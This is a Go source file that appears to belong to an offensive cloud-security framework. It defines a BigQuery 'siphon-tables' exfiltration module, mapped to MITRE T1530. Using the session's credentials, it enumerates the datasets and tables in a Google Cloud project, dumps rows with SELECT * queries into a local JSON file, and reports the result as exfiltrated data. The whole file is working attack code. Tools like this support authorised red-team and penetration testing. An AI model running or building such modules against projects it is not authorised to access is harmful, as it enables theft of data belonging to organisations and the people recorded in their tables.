package bigquery

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"

	bq "cloud.google.com/go/bigquery"
	"google.golang.org/api/iterator"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&SiphonTables{})
}

// SiphonTables enumerates BigQuery datasets/tables and exports rows locally.
type SiphonTables struct{}

func (m *SiphonTables) Info() module.Info {
	return module.Info{
		Name:         "exfil.bigquery.siphon-tables",
		Tactic:       module.TacticExfil,
		Service:      "bigquery",
		Description:  "List BigQuery datasets and tables, then download rows locally",
		RequiresAuth: true,
		AttackID:     "T1530",
	}
}

func (m *SiphonTables) Run(ctx module.RunContext) error {
	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	dataset := ctx.Flags["dataset"]
	table := ctx.Flags["table"]
	outputDir := ctx.Flags["output"]
	maxRowsStr := ctx.Flags["max-rows"]

	maxRows := 1000
	if maxRowsStr != "" {
		if v, err := strconv.Atoi(maxRowsStr); err == nil && v > 0 {
			maxRows = v
		}
	}

	if outputDir == "" {
		outputDir = "."
	}

	bgCtx := context.Background()
	client, err := bq.NewClient(bgCtx, project, ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create BigQuery client: %w", err)
	}
	defer client.Close()

	// If no dataset specified, enumerate all datasets.
	if dataset == "" {
		output.Info("Enumerating datasets in project: %s", project)
		it := client.Datasets(bgCtx)
		for {
			ds, err := it.Next()
			if err == iterator.Done {
				break
			}
			if err != nil {
				output.Warn("Error listing datasets: %v", err)
				break
			}
			output.Info("  Dataset: %s", ds.DatasetID)

			// List tables in each dataset.
			tblIt := ds.Tables(bgCtx)
			for {
				tbl, err := tblIt.Next()
				if err == iterator.Done {
					break
				}
				if err != nil {
					output.Warn("    Error listing tables: %v", err)
					break
				}
				output.Info("    Table: %s.%s", ds.DatasetID, tbl.TableID)
			}
		}
		output.Info("Specify --dataset and --table to download rows.")
		return nil
	}

	if table == "" {
		// List tables in the specified dataset.
		output.Info("Listing tables in dataset: %s.%s", project, dataset)
		ds := client.Dataset(dataset)
		tblIt := ds.Tables(bgCtx)
		for {
			tbl, err := tblIt.Next()
			if err == iterator.Done {
				break
			}
			if err != nil {
				return fmt.Errorf("list tables: %w", err)
			}
			output.Info("  Table: %s", tbl.TableID)
		}
		output.Info("Specify --table to download rows.")
		return nil
	}

	// Download rows from the specified table.
	output.Info("Downloading up to %d rows from %s.%s.%s", maxRows, project, dataset, table)

	query := fmt.Sprintf("SELECT * FROM `%s.%s.%s` LIMIT %d", project, dataset, table, maxRows)
	q := client.Query(query)

	job, err := q.Run(bgCtx)
	if err != nil {
		return fmt.Errorf("run query: %w", err)
	}

	it, err := job.Read(bgCtx)
	if err != nil {
		return fmt.Errorf("read query results: %w", err)
	}

	var rows []map[string]bq.Value
	for {
		var row map[string]bq.Value
		err := it.Next(&row)
		if err == iterator.Done {
			break
		}
		if err != nil {
			return fmt.Errorf("iterate rows: %w", err)
		}
		rows = append(rows, row)
	}

	output.Info("Retrieved %d rows", len(rows))

	// Write rows to a JSON file.
	outPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s_%s.json", project, dataset, table))
	data, err := json.MarshalIndent(rows, "", "  ")
	if err != nil {
		return fmt.Errorf("marshal rows: %w", err)
	}

	if err := os.WriteFile(outPath, data, 0o600); err != nil {
		return fmt.Errorf("write output file: %w", err)
	}

	output.Success("Rows saved to: %s", outPath)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "exfil.bigquery.siphon-tables",
			Severity:    module.SevHigh,
			Title:       "BigQuery data exfiltrated",
			Description: fmt.Sprintf("Downloaded %d rows from %s.%s.%s to %s", len(rows), project, dataset, table, outPath),
			Resource:    fmt.Sprintf("%s.%s.%s", project, dataset, table),
			Project:     project,
		}
	}

	return nil
}
